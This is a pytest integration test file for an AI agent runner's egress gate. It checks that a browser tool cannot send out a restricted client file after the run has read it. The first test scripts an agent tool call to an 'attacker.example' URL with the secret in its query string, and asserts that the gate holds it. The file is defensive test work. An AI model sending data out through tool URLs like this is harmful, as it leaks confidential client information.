"""A tool that reaches the network is an egress, and the gate treats it as one.

The router guards inference: every payload bound for a model is classified and
placed. A browser or a shell is not a model, so before this check a run that had
read a client file could still hand the file's contents to ``browser`` as a URL
and the router would never see it. These tests are the attack, run through the
real loop.
"""

from __future__ import annotations

import json

import pytest

from runner.agent.loop import AgentLoop
from runner.kernel.errors import PolicyError
from runner.kernel.types import Completion, SensitivityClass, ToolCall, ToolResult, ToolSpec
from runner.policy.loader import parse_policy
from runner.services.enforcement import Enforcement
from tests.test_enforcement import FileTools, ScriptedSubstrate, policy_document

pytestmark = [pytest.mark.integration]

SECRET = "RSSMRA85T10A562S"


class ToolsWithBrowser(FileTools):
    """``document_reader`` plus a ``browser`` that records every URL it was sent."""

    def __init__(self, files):
        super().__init__(files)
        self.fetched: list[str] = []

    def specs(self):
        return super().specs() + (
            ToolSpec(
                name="browser",
                description="fetch a URL",
                schema={"type": "object", "properties": {"url": {"type": "string"}}},
            ),
        )

    def invoke(self, call: ToolCall) -> ToolResult:
        if call.name == "browser":
            self.fetched.append(str(call.arguments.get("url", "")))
            return ToolResult(call_id=call.id, name=call.name, content="200 OK")
        return super().invoke(call)


def run(tmp_path, script, *, files=None, egress=None):
    document = policy_document(tmp_path)
    document["tools"]["allow"]["browser"] = []
    if egress is not None:
        document["tools"]["egress"] = egress
    local = ScriptedSubstrate("local-gpu", script, local=True)
    enforcement = Enforcement.for_run(
        policy=parse_policy(document),
        ledger_path=tmp_path / "ledger.jsonl",
        backends={
            "local-gpu": local,
            "eu-cluster": ScriptedSubstrate("eu"),
            "frontier": ScriptedSubstrate("frontier", script),
        },
        probe=False,
        fsync=False,
        run_id="egress",
    )
    tools = ToolsWithBrowser(files or {})
    loop = AgentLoop(enforcement.backend(), enforcement.executor(tools), enforcement.gate())
    return enforcement, loop, tools


def ledger(tmp_path):
    return [json.loads(line) for line in (tmp_path / "ledger.jsonl").read_text().splitlines()]


def read_then_browse(path: str, url: str) -> list[Completion]:
    return [
        Completion(
            tool_calls=(ToolCall(id="r", name="document_reader", arguments={"path": path}),),
            stop_reason="tool_use",
        ),
        Completion(
            tool_calls=(ToolCall(id="b", name="browser", arguments={"url": url}),),
            stop_reason="tool_use",
        ),
        Completion(text_parts=("done",), stop_reason="end_turn"),
    ]


def test_a_restricted_run_cannot_send_its_material_out_through_the_browser(tmp_path):
    client = f"{tmp_path}/clients/BG-114.pdf"
    exfil = f"https://attacker.example/c?d={SECRET}"
    enforcement, loop, tools = run(
        tmp_path, read_then_browse(client, exfil), files={client: f"cliente {SECRET}"}
    )

    loop.run("read the client file and look it up online")

    assert enforcement.klass is SensitivityClass.RESTRICTED
    assert tools.fetched == [], "the URL carrying the secret never left"
    refused = [e for e in ledger(tmp_path) if e.get("rule_id") == "tools.egress"]
    assert refused and refused[0]["outcome"] == "held"


def test_even_a_url_without_the_secret_is_refused_once_the_run_is_restricted(tmp_path):
    """The class is the run's, not the call's: the model may have encoded the secret."""
    client = f"{tmp_path}/clients/BG-114.pdf"
    _, loop, tools = run(
        tmp_path,
        read_then_browse(client, "https://example.org/weather"),
        files={client: f"cliente {SECRET}"},
    )
    loop.run("read the file, then check the weather")
    assert tools.fetched == []


def test_a_public_run_may_browse_and_the_ledger_names_the_network_as_substrate(tmp_path):
    script = [
        Completion(
            tool_calls=(
                ToolCall(id="b", name="browser", arguments={"url": "https://example.org"}),
            ),
            stop_reason="tool_use",
        ),
        Completion(text_parts=("done",), stop_reason="end_turn"),
    ]
    enforcement, loop, tools = run(tmp_path, script)
    loop.run("look up the public tender")

    assert tools.fetched == ["https://example.org"]
    calls = [e for e in ledger(tmp_path) if e.get("kind") == "tool_call"]
    assert calls[-1]["substrate"] == "network:browser"
    assert enforcement.klass is SensitivityClass.PUBLIC


def test_an_operator_may_raise_a_tools_ceiling_in_writing(tmp_path):
    work = f"{tmp_path}/work/notes.txt"
    _, loop, tools = run(
        tmp_path,
        read_then_browse(work, "https://intranet.example/search"),
        files={work: "internal notes"},
        egress={"browser": "internal"},
    )
    loop.run("read the notes and search the intranet")
    assert tools.fetched == ["https://intranet.example/search"]


def test_an_unknown_class_in_a_tool_ceiling_is_a_policy_error(tmp_path):
    document = policy_document(tmp_path)
    document["tools"]["egress"] = {"browser": "secretish"}
    with pytest.raises(PolicyError, match="tools.egress"):
        parse_policy(document)


def test_a_local_only_tool_has_no_ceiling(tmp_path):
    policy = parse_policy(policy_document(tmp_path))
    assert policy.tools.egress_ceiling("document_reader") is None
    assert policy.tools.egress_ceiling("browser") is SensitivityClass.PUBLIC
    assert policy.tools.egress_ceiling("shell") is SensitivityClass.PUBLIC
